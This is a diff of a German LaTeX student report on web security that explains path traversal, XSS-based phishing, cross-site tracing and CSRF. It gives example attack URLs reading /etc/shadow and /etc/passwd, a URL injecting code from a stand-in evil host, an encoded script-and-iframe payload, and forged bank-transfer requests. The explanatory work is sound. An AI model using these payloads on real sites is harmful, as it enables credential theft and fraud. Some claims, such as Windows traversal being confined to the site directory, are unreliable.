@@ -14,6 +14,31 @@ möglich ist und wie man Passwörter speichert. Dazu werden wir einige Code Beis
 \label{sec:tfa}
 \subsubsection{Path-Traversal}
 \label{sec:Path-Traversal}
+Als Path-Traversal wird eine Security Lüge bezeichnet die es einem Angreifer, durch Manipulation des URLs auf Daten zuzugreifen, auf die er nicht zugriffen können sollte. 
+\subsubsection{Grundprinzip}
+Man sollte nicht auf Dateien, die sich außerhalb vom Web-Directory befinden, von einem Webserver zugreifen können. Beim Path-Traversal versucht man als Angreifer durch beifügen von Pfadangaben das Verzeichnis zum Root-Verzeichnis zu wechseln. 
+//
+Man benutzt ../ als Parameter zum Wechseln des Verzeichnisses.
+\subsubsection{Beispiele}
+\begin{enumerate}
+\item Windows
+\begin{enumerate}
+\item \url{http://www.example.com/index.foo?item=../../../Config.sys}
+\item \url{http://www.example.com/index.foo?item=../../../Windows/System32/cmd.exe?/C+dir+C:}
+\end{enumerate}
+\item Linux
+\begin{enumerate}
+\item \url{http://some_site.com.br/../../../../etc/shadow }
+\item \url{http://some_site.com.br/get-files?file=/etc/passwd}
+\end{enumerate}
+\end{enumerate}
+Anhand dieser Beispiele kann man sehen, das einem diese Schwäche ermöglicht lokale Passwörter auszulesen und Windows Configs.  
+\\ \\
+Unter Linux ist diese Schwäche kritischer da man hier auf die komplette Festplatte Zugriff bekommt. In Windows kann man sich nur im lokalen Directory bewegen, wo sich die Website befindet.
+\\ \\
+Eine weitere Anwendungsmöglichkeit ist es auf seine eigene bösartige Seite zu verweisen und über diese code einzufügen mit dem man sich noch mehr Möglichkeiten verschafft. \\ \\
+\url{http://some_site.com.br/some-page?page=http://BoeseSeite.com.br/other-page.htm/malicius-code.php}
+\subsubsection{Protection Path-Traversal}
 \subsubsection{XSS Protection}
 \label{sec:xss}
 \subsubsection{Allgemeines über XSS}
@@ -39,14 +64,14 @@ Beim Session Hijacking werden, wie es einem der Name schon verrät, Sessions von
 Website-Defacements hat etwas von digitalem Graffiti. Hier wird XSS genutzt um sich den Zugriff auf die Webseite zu verschaffen und sie dann optisch zu verändern. 
 \subsubsection{Phishing}
 Im Prinzip ist Phishing die Intention mit Fake Webseiten oder Emails an vertrauliche Daten eines Users zu kommen. Ein Beispiel wäre mit einem gefälschten Facebook Login an die Login Daten eines Benutzers zu kommen. 
-\\Doch wie hängt das mit XSS zusammen?\\Bei einer Url hat man sehr oft eine Abfragezeichenfolge. Diese werden benutzt um beliebige Werte zu übergeben. Beispielweise würde die Url 
-\url{ http://www.Sehr-Sichere-Webseite.com/program?value} den Parameter value and das Programm schicken.Und hier kommt Cross-Site-Scripting ins Spiel und man könnte wieder etwas bösartiges übergeben.\\Ein Angreifer könnte jetzt diese Schwäche ausnutzen um zu eine anderen Website weiterzuleiten und selbst noch etwas hinzufügen, beispielsweise der Abfrage von Login Daten. \\Beispiel\\
+\\ \\Doch wie hängt das mit XSS zusammen?\\ \\Bei einer Url hat man sehr oft eine Abfragezeichenfolge. Diese werden benutzt um beliebige Werte zu übergeben. Beispielweise würde die Url 
+\url{ http://www.Sehr-Sichere-Webseite.com/program?value} den Parameter value and das Programm schicken.Und hier kommt Cross-Site-Scripting ins Spiel und man könnte wieder etwas bösartiges übergeben.\\ \\Ein Angreifer könnte jetzt diese Schwäche ausnutzen um zu eine anderen Website weiterzuleiten und selbst noch etwas hinzufügen, beispielsweise der Abfrage von Login Daten. \\ \\Beispiel\\ \\
 \url{"http://www.EineFinanzseite.com/?q=
 %3Cscript%3Edocument.write%28%22%3Ciframe+src%3D%27
 http%3A%2F%2Fwww.BoeseSeite.com%27+
 FRAMEBORDER%3D%270%27+WIDTH%3D%27800%27+HEIGHT%3D%27640%27
 +scrolling%3D%27auto%27%3E%3C%2Fiframe%3E%22%29%3C%2Fscript%3E&...=...&... "}
-\\
+\\ \\
 Wobei die Modulo Buchstaben in Hexadezimal folgendes darstellen
 \\ 3C : <
 \\ 3E : >
@@ -56,19 +81,19 @@ Wobei die Modulo Buchstaben in Hexadezimal folgendes darstellen
 \\ 27 : '
 \\ 3A : :
 \\ 2F : /
-\\ 29 : )\\
-Es ergibt sich daraus \\
+\\ 29 : )\\ \\
+Es ergibt sich daraus \\ \\
 \url{http://www.EineFinanzseite.com/?q=<script>document.write("<iframe src='http://www.BoeseSeite.com' FRAMEBORDER='0' WIDTH='800' HEIGHT='640' scrolling='auto'></iframe>")</script>&...=...&...">}
-\\Beim Ausführen wird dann HTML Code eingefügt 
-\\
+\\ \\Beim Ausführen wird dann HTML Code eingefügt 
+\\ \\
 <iframe src='http://www.BoeseSeite.com' FRAMEBORDER='0' WIDTH='800' HEIGHT='640' scrolling='auto'></iframe>
-\\
+\\ \\
 Diese IFrame beinhaltet jetzt Code von der Bösen Seite und ermöglicht dem Angreifen eingegebene Daten vom User zu sehen. 
 \subsubsection{Cross-Site-Tracing XST}
 Beim Cross-Site-Tracing wird XSS und die HTTP-Methoden TRACE oder Track verwendet. TRACE ermöglicht dem Client, zu sehen, was am anderen Ende der Anforderungskette empfangen wird, und diese Daten für Test- oder Diagnoseinformationen zu verwenden.Die TRACK-Methode funktioniert auf gleich, ist jedoch spezifisch für IIS von Microsoft. Cross-Site-Tracing kann als Methode zum Stehlen von User-Cookies über Cross-Site-Scripting verwendet werden, auch wenn für das Cookie das Kennzeichen "HttpOnly" gesetzt ist und / oder der Autorisierungsheader des Benutzers verfügbar gemacht wird.
-\\
+\\ \\
 Obwohl die TRACE-Methode scheinbar harmlos ist, kann sie in einigen Szenarien erfolgreich eingesetzt werden, um die Berechtigungsnachweise legitimer Benutzer zu stehlen. Diese Angriffsmethode wurde 2003 von Jeremiah Grossman entdeckt, um den HttpOnly-Tag zu umgehen, den Microsoft in Internet Explorer 6 sp1 eingeführt hat, um Cookies vor dem Zugriff durch JavaScript zu schützen. Tatsächlich besteht eines der am häufigsten auftretenden Angriffsmuster in Cross Site Scripting darin, auf das document.cookie -Objekt zuzugreifen und es an einen vom Angreifer kontrollierten Webserver zu senden, damit er / sie die Sitzung des Opfers entführen kann. Das Markieren eines Cookies, da HttpOnly JavaScript den Zugriff auf das Cookie verbietet und es vor dem Senden an Dritte schützt. Die TRACE-Methode kann jedoch verwendet werden, um diesen Schutz zu umgehen und auf das Cookie selbst in diesem Szenario zuzugreifen.
-\\
+\\ \\
 Modernere Browser verhindern das TRACE über JavaScript gesendet werden kann.
 \subsubsection{Beispiel}
 \begin{lstlisting}
@@ -83,28 +108,28 @@ Modernere Browser verhindern das TRACE über JavaScript gesendet werden kann.
 \end{lstlisting}
 \subsubsection{Wie gewährleisten wir XSS Protection}
 Die Webseite beschränkt sich generell auf wenige Eingabe fenster wo eine Standard XSS versucht werden könnte. Alle diese Eingaben erlauben keine Tags oder Sonderzeichen. Auch Url Parameter können nie direkt gesendet werden und somit fällt auch der URL Faktor weg.
-\\
+\\ \\
 Alle Möglichen Eingabefelder
-\\
+\\ \\
 \includegraphics[width=20cm, height=10cm]{Webseite_XSS_img1}
 \includegraphics[width=20cm, height=10cm]{Webseite_XSS_img2}
 \includegraphics[width=14cm, height=6cm]{Webseite_XSS_img3}
-\\
-In den URLS werden durch MVC und passende Implementierung nie Parameter gesendet bei denen man XSS Code einfügen könnte.\\
+\\ \\
+In den URLS werden durch MVC und passende Implementierung nie Parameter gesendet bei denen man XSS Code einfügen könnte.\\ \\
 Dadurch hat unsere Webseite eine Funktionierende XSS Protection
 
 \subsubsection{XSRF/CSRF Protection}
 \label{sec:csrf}
 \subsubsection{Was ist XSRF/CSRF}
 CSRF steht für Cross-Site Request Forgery. CSRF ist ein Angriff, bei dem das Opfer dazu gebracht wird, eine böswillige Anfrage zu übermitteln. Als Angreifer erbt man dabei die Identität und die Privilegien des Opfers und kann beispielsweise eine unerwünschte Funktion im Namen des Opfers ausführen. Bei den meisten Websites enthalten Browser-Anforderungen automatisch alle mit der Website verknüpften Anmeldeinformationen, z. B. Sitzungscookies des Benutzers, IP-Adresse, Anmeldeinformationen der Windows-Domäne usw. Wenn der Benutzer derzeit für die Seite authentifiziert ist, hat die Seite keine Möglichkeit, zwischen der vom Opfer gesendeten gefälschten Anfrage und einer vom Opfer gesendeten legitimen Anfrage zu unterscheiden.
-\\
+\\ \\
 Eine CSRF zielt oft darauf Daten zu Ändern. Beispielsweise das Kennwort und die Email eines Kontos oder das Kaufen eines Gegenstands.   der Angreifer erhält keine Antwort , sondern das Opfer. CSRF-Angriffe zielen daher auf Zustandsänderungsanforderungen ab.
-\\
+\\ \\
 Es ist manchmal möglich, den CSRF-Angriff auf der verwundbaren Seite selbst zu speichern. Das kann durch einfaches Speichern eines IMG- oder IFRAME-Tags in einem HTML-fähigen Feld oder durch einen komplexeren Cross-Site-Scripting-Angriff erreicht werden. Wenn der Angriff einen CSRF-Angriff in der Seite speichern kann, wird der Schweregrad des Angriffs erhöht. 
 
 \subsubsection{Wie Funktioniert eine Solche Attacke}
 Man baut sich eine bösartige URL oder ein bösartiges Skript und bringt das Opfer dazu den URL aufzurufen. 
-\\
+\\ \\
 Beispiel
 \begin{lstlisting}
 GET http://bank.com/transfer.do?acct=Angreiger&amount=1000 HTTP/1.1
@@ -114,7 +139,7 @@ Oder
 <a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>
 \end{lstlisting}
 Auch eine Post Request ist möglich
-\\
+\\ \\
 \begin{lstlisting}
 POST http://bank.com/transfer.do HTTP/1.1
 acct=Angreifer&amount=1000
